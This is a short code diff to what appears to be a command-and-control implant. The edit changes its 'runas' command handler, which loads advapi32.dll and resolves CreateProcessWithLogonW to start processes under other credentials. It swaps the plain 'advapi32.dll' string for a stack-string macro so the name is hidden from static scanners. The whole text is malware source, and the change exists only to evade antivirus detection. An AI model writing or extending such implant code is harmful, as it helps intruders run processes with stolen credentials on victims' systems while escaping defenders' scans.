@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <stackstr.h>
 
 #ifdef INCLUDE_CMD_RUNAS
 
@@ -60,8 +61,8 @@ auto declfn starburst::cmd_runas(
     memory::copy( cmd_buf, cmd_str, cmd_len < 1023 ? cmd_len : 1023 );
 
     // Load advapi32.dll and resolve CreateProcessWithLogonW
-    auto h_advapi32 = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
-        symbol<LPCSTR>( "advapi32.dll" ) ) );
+    STK_ADVAPI32(_n);
+    auto h_advapi32 = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
     if ( !h_advapi32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "LoadLibrary advapi32 failed" ) ) );
